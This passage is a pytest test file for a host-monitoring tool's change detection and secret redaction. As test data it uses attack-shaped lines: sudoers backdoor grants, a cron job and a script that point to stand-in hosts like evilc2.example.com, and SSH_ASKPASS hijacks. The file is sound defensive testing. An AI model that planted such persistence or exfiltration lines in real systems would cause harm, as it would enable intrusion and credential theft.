        hits = " ".join(since.malicious_hits(line))
        assert expect in hits, (line, hits)


def test_changed_persistence_item_is_escalated_everywhere(monkeypatch):
    """The other half of the hijack fix, with no plutil dependency: overwriting an EXISTING
    startup item used to be a quiet YELLOW hash change. Must hold on Linux (systemd units) too."""
    monkeypatch.setattr(since, "trust_of", lambda p: (None, False))
    b = snap(collectors={"launch_items": {"nginx.service": "enabled [aaaa]"}})
    c = snap(collectors={"launch_items": {"nginx.service": "enabled [bbbb]"}})
    f = next(x for x in since.build_findings(b, c) if x["category"] == "launch_items")
    assert f["action"] == "changed" and f["level"] >= since.ORANGE


# The path-component exemption (`/`-preceded key = a filename, not an assignment target) leaked
# real credentials until it was narrowed to WHITESPACE separators only. The suite passed WITH the
# leak because it had no case of this shape — a '/' immediately before a credential key.
@pytest.mark.parametrize("line", [
    "+//registry.npmjs.org/_authToken=SECRETVAL12",     # a genuine .npmrc spelling
    "+//npm.pkg.github.com/_password=SECRETVAL12",
    "+https://host/api_key=SECRETVAL12",
    "+curl -d /v1/token=SECRETVAL12 https://x",
    "+/etc/foo/password=SECRETVAL12",
    "+source /opt/x/secret=SECRETVAL12",
    "+PATH=/usr/bin:/x/token=SECRETVAL12",
])
def test_slash_preceded_assignment_still_redacts(line):
    assert "SECRETVAL12" not in since.redact(line)
    for marker in ("", "-"):
        assert "SECRETVAL12" not in since.redact(marker + line[1:])


@pytest.mark.parametrize("line", [
    "+deva ALL=(ALL) NOPASSWD: /usr/bin/passwd backdoor2026",
    "+deva ALL=(ALL) NOPASSWD: /usr/sbin/chpasswd attacker99",
])
def test_sudoers_command_and_argument_shown(line):
    """A sudoers tag's value is the granted command, and the token after it is an argument —
    the account being reset. Both stay visible (the tag rule consumes the command path, so the
    argument is never scanned as a value)."""
    assert since.redact(line) == line


# The DELIBERATE trade for closing the path-final-keyword leak (a token passed as argv to a
# credential-named script printed in cleartext). There is no structural difference between
# `/opt/bin/refresh_token <secret>` and `/tmp/token_stealer.sh <host>`, so the tie is broken
# toward not leaking. What must survive: the script path, and anything AFTER the masked token.
def test_path_final_keyword_masks_only_the_next_token():
    out = since.redact("+deva ALL=(ALL) NOPASSWD: /bin/bash /tmp/token_stealer.sh evilc2.example.com")
    assert "/tmp/token_stealer.sh" in out and "NOPASSWD:" in out
    assert "evilc2.example.com" not in out           # the cost of the trade, accepted
    out2 = since.redact("+*/5 * * * * /usr/local/bin/passwd_sync.sh --dest http://evil/x")
    assert "/usr/local/bin/passwd_sync.sh" in out2
    assert "http://evil/x" in out2, "only the immediate next token is masked"


@pytest.mark.parametrize("line,secret", [
    ("+*/5 * * * * /opt/bin/refresh_token SeCrEtVal123abc", "SeCrEtVal123abc"),
    ("+/etc/foo/api_key SeCrEtVal123", "SeCrEtVal123"),
    ("+//registry.npmjs.org/_auth SeCrEtVal123", "SeCrEtVal123"),
    ("+cmd /a/b/Authorization SeCrEtVal123", "SeCrEtVal123"),
])
def test_argv_secret_after_a_credential_named_path_is_masked(line, secret):
    assert secret not in since.redact(line)


@pytest.mark.parametrize("line,secret", [
    ("+deva ALL=(ALL) NOPASSWD: ALL=SeCrEtVal123", "SeCrEtVal123"),
    ("+deva ALL=(ALL) PASSWD: ALL:SeCrEtVal123", "SeCrEtVal123"),
])
def test_sudoers_all_lookahead_cannot_be_widened(line, secret):
    """`ALL` must be followed by end/space/comma — `ALL=<secret>` was accepted as a command
    spec and exempted the value."""
    assert secret not in since.redact(line)


def test_sudoers_tags_are_case_sensitive():
    """A lowercase token posed as "a further tag" and exempted the rest of the line."""
    assert "«redacted»" in since.redact("+deva ALL=(ALL) NOPASSWD: passwd: SeCrEtVal123")


@pytest.mark.parametrize("line", ["+export SSH_ASKPASS=/evil", "+export SSH_AUTH_SOCK=/tmp"])
def test_single_segment_hijack_path_is_shown(line):
    """`SSH_ASKPASS=/evil` is a genuine hijack shape; a high-entropy single segment
    (`SECRET_FILE=/hunter2Xyz9`) still masks."""
    assert since.redact(line) == line
    assert "hunter2Xyz9" not in since.redact("+export SECRET_FILE=/hunter2Xyz9")
